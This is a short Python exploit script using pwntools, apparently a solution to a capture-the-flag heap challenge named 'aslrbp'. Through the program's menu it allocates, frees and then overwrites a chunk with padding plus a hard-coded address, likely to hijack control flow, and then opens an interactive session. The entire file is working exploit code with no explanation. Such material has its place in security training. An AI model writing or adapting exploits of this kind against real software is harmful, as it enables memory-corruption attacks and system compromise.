from pwn import *
context.log_level="DEBUG"
p = process(["./aslrbp", "./1"])

p.sendlineafter(b">", b"1")
p.sendlineafter(b"Index (0-7):", b"0")
p.sendlineafter(b"Size of data:", b"8")
p.sendlineafter(b"Content:", b"lol")
p.sendlineafter(b">", b"2")
p.sendlineafter(b"Index (0-7):", b"0")
p.sendlineafter(b">", b"4")
p.sendlineafter(b"Raw index (0-7):", b"0")
p.sendlineafter(b"Raw data (16 bytes):", b"A"*8+p64(0x100000610))
p.sendlineafter(b">", b"3")
p.interactive()
